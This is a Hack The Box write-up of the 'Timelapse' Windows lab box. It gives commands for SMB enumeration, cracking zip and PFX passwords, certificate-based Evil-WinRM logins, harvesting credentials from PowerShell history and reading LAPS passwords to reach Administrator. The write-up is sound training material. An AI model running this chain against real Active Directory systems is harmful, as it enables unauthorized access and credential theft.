## HTB: Timelapse Walkthrough

# 📌 Box Info
- **OS**: [Windows](Windows)
- **Difficulty**: [Easy](Easy)

### Recon
- **Nmap Scan:**
  - Found 18 open ports including: SMB (445), [Kerberos](Kerberos) (88), [LDAP](LDAP) (389), and [WinRM](WinRM) (5986)
  - Domain: `timelapse.htb`
  - Hostname: `dc01.timelapse.htb`

```bash
nmap -p- --min-rate 10000 10.10.11.152
nmap -p <interesting_ports> -sCV 10.10.11.152
```

- **/etc/hosts Addition:**
```
10.10.11.152 timelapse.htb dc01.timelapse.htb
```

### [SMB](SMB) Enumeration
- SMB anonymous login was successful:
```bash
smbclient -L //dc01.timelapse.htb -N
```
- Notable share: `Shares`
  - Found file: `winrm_backup.zip`
  - Found LAPS documentation in `HelpDesk`

### Shell as `legacyy`
- **Extracted `winrm_backup.zip` → `legacyy_dev_auth.pfx`**
- **Cracked zip password using john:** `supremelegacy`
- **Cracked PFX password using pfx2john + john:** `thuglegacy`
- **Extracted cert & private key:**
```bash
openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out key-enc.pem
openssl rsa -in key-enc.pem -out legacyy_dev_auth.key
openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out legacyy_dev_auth.crt
```
- **Connected using Evil-WinRM:**
```bash
evil-winrm -i timelapse.htb -S -c legacyy_dev_auth.crt -k legacyy_dev_auth.key
```
- Grabbed `user.txt`

### Shell as `svc_deploy`
- **Found PowerShell history file:**
```powershell
C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```
- **Credentials found:**
  - `svc_deploy:E3R$Q62^12p7PLlC%KWaxuaV`
- **Connected with Evil-WinRM:**
```bash
evil-winrm -i timelapse.htb -S -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV'
```

### Shell as Administrator
- `svc_deploy` is a member of the `LAPS_Readers` group.
- Queried LAPS for DC01 local admin password:
```powershell
Get-ADComputer DC01 -property 'ms-mcs-admpwd'
```
- Found password: `uM[3va(s870g6Y]9i]6tMu{j`
- Connected as Administrator:
```bash
evil-winrm -i timelapse.htb -S -u administrator -p 'uM[3va(s870g6Y]9i]6tMu{j'
```

### Root.txt
- `root.txt` not in Administrator desktop.
- Found under `C:\Users\TRX\Desktop\root.txt`

### Notes
- TRX account exists for HTB flag rotation purposes due to dynamic nature of LAPS.
